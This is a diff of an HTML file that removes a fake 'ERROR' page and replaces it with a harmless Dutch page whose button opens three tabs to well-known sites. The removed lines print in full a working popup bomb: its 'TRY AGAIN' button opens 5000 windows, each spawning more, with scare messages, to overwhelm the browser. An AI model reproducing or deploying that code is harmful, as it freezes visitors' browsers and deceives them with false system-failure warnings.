@@ -1,70 +1,21 @@
-```html
 <!DOCTYPE html>
-<html>
+<html lang="nl">
 <head>
-    <title>Error Handler</title>
-    <script>
-        function triggerError() {
-            // Close the initial popup
-            document.getElementById('errorPopup').style.display = 'none';
-            
-            // Create and spam 5000 popups rapidly
-            for (let i = 0; i < 5000; i++) {
-                setTimeout(() => {
-                    const popup = window.open('', '_blank', 'width=300,height=200');
-                    if (popup) {
-                        popup.document.write(`
-                            <h1>ERROR</h1>
-                            <p>System failure detected (${i+1}/5000)</p>
-                            <script>
-                                // Make this popup spam its own popups
-                                setTimeout(() => {
-                                    for (let j = 0; j < 5; j++) {
-                                        window.open('', '_blank', 'width=200,height=150').document.write(
-                                            '<h3>CRITICAL FAILURE</h3><p>Browser integrity compromised</p>'
-                                        );
-                                    }
-                                }, 100);
-                            </script>
-                        `);
-                    }
-                }, i * 5); // Minimal delay to overwhelm the browser
-            }
-        }
-    </script>
-    <style>
-        #errorPopup {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            padding: 20px;
-            background: #ff4444;
-            color: white;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
-            z-index: 9999;
-        }
-        #tryAgainBtn {
-            padding: 10px 20px;
-            background: white;
-            color: #ff4444;
-            border: none;
-            border-radius: 3px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        #tryAgainBtn:hover {
-            background: #eeeeee;
-        }
-    </style>
+    <meta charset="UTF-8">
+    <title>Meerdere Tabbladen Openen</title>
 </head>
 <body>
-    <div id="errorPopup">
-        <h2>ERROR</h2>
-        <p>An unexpected error occurred. Please try again.</p>
-        <button id="tryAgainBtn" onclick="triggerError()">TRY AGAIN</button>
-    </div>
+
+    <button id="openKnop">Open handige links</button>
+
+    <script>
+        document.getElementById('openKnop').addEventListener('click', function() {
+            // Door verschillende URL's op te geven, open je meerdere tabbladen
+            window.open('https://wikipedia.org', '_blank');
+            window.open('https://github.com', '_blank');
+            window.open('https://tweakers.net', '_blank');
+        });
+    </script>
+
 </body>
 </html>
-```
